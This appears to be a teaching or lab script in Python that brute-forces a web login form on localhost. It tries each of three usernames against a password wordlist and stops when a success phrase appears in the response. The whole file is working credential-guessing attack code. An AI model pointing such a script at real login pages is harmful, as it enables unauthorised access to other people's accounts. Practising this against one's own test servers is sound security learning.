import requests # For sending HTTP requests
import sys # For writing dynamic output to the terminal

# Target URL
target = "http://127.0.0.1:5000"

# List of usernames to attempt
usernames = ["admin", "user", "test"]

#Path to the password wordlist
passwords = "best110.txt"

# A keyword in the HTTP response indicating successful login
needle = "Welcome back"

# A loop that loops over each username in the username list
for username in usernames:
	#Opens the password list file
	with open(passwords, "r") as passwords_list:
		# Loops over each password in the file
		for password in passwords_list:
			password = password.strip("\n").encode() # Removes newline and encodes 
			# Prints a dynamic line showing the current attempt
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username,password.decode()))
			sys.stdout.flush() # Ensure it prints immediately without a newline
			# Send a POST request with the current username and password being iterated over
			r = requests.post(target, data = {"username": username, "password": password})
			# Check if the success keyword exists in the response
			if needle.encode() in r.content:
				sys.stdout.write("\n") # Moves to a newline
				sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
				sys.exit() # Stops execution once a valid login is found
		#Flush and print a message if no password was correct for this username		
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\tNo password found for '{}'!".format(username))